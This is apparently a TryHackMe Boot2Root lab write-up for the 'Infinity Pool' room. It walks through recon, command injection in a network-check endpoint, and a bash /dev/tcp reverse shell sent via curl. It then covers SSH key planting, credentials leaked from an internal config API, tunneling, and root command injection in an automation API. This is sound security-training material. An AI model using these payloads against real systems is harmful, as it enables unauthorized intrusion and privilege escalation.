# THM - Hacker Holidays Day 11: Infinity Pool
**Category:** Boot2Root
**Difficulty:** Medium

## Tools Used
- nmap
- gobuster
- curl
- netcat
- chisel
- Browser (Firefox)

## Steps

1. Connected to TryHackMe VPN: `sudo openvpn thm.ovpn`
2. Ran `nmap -sC -sV <IP>` — found port 22 (SSH) and port 80 (HTTP/Gunicorn)
3. Ran `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,py,txt` — found `/robots.txt` and `/status`
4. Read `/robots.txt` — confirmed `/internal/netcheck` and `/status` are disallowed
5. Opened `/status` — found a staff connectivity tool that POSTs a `host` parameter to `/internal/netcheck`
6. Tested command injection: `127.0.0.1;id` — output confirmed RCE as user `web`
7. Started listener: `nc -lvnp 4444`
8. Sent reverse shell payload via curl:
```````bash
curl -s -X POST http://<IP>/internal/netcheck \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<tun0_IP>/4444 0>&1'"
` ``
9. Got shell as `web` — read user flag: `cat /home/web/user.txt`
10. Enumerated running processes: `ps aux` — found three loopback-only services:
    - `127.0.0.1:3000` — Watchtower (svc-watch)
    - `127.0.0.1:8080` — Apache/FreePBX (asterisk)
    - `127.0.0.1:9000` — Automation (root)
11. Queried Watchtower config endpoint:
``````bash
curl -s http://127.0.0.1:3000/api/config
` ``
Leaked FreePBX credentials: `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026` and confirmed automation endpoint at port 9000
12. Queried Automation health endpoint:
`````bash
curl -s http://127.0.0.1:9000/health
` ``
Confirmed `POST /jobs/export` requires a Bearer token and runs as root
13. Added Kali SSH public key to `/home/web/.ssh/authorized_keys` to enable SSH access
14. Created SSH tunnel from Kali to forward FreePBX port locally:
````bash
ssh -i ~/.ssh/id_rsa -L 8080:127.0.0.1:8080 web@<IP>
` ``
15. Opened `http://127.0.0.1:8080/ucp/` in browser — logged in with leaked credentials
16. Created a dashboard, added the Voicemail widget — inbox contained one message with the automation Bearer key in the caller ID field
17. Used the Bearer key to exploit command injection in the `report` parameter:
```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer <key>" \
  -H "Content-Type: application/json" \
  -d '{"report":"test; cat /root/root.txt;"}'
` ``
18. Got root flag from the API response output field

## What I Learned
- Command injection in a ping utility is exploitable with simple semicolons — always test `; id` before assuming a field is safe
- Loopback-only services are not a security boundary once you have a foothold — enumerate all listening ports with `ps aux` and `ss -lntp`
- Unauthenticated internal config endpoints are dangerous — Watchtower's `/api/config` leaked credentials that unlocked the entire privilege escalation chain
- FreePBX UCP requires JavaScript to complete login — curl-based authentication fails; use an SSH tunnel and a real browser instead
- The `report` field in the automation API was interpolated directly into a shell command — injecting `;` terminated the `tar` command and ran arbitrary code as root
- A service running as root with no input validation on shell-executed parameters is a direct path to full system compromise
```
